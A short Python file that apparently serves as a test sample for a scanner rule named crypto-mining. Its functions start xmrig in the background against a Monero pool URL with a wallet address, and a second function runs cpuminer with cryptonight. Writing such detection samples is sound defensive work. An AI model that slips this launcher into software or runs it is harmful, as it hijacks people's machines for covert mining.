# Crypto mining — should trigger rule: crypto-mining
import subprocess

POOL_URL = "stratum+tcp://pool.minexmr.com:4444"
WALLET = "44AFFq5kSiGBoZ4NMDwYtN18NkbRiNhGLux3nbmso7rU"

def start_mining():
    """Start background mining process."""
    subprocess.Popen([
        "xmrig",
        "--url", POOL_URL,
        "--user", WALLET,
        "--threads", "4",
        "--background"
    ])

def alt_mine():
    subprocess.run(["./cpuminer", "-a", "cryptonight", "-o", POOL_URL])
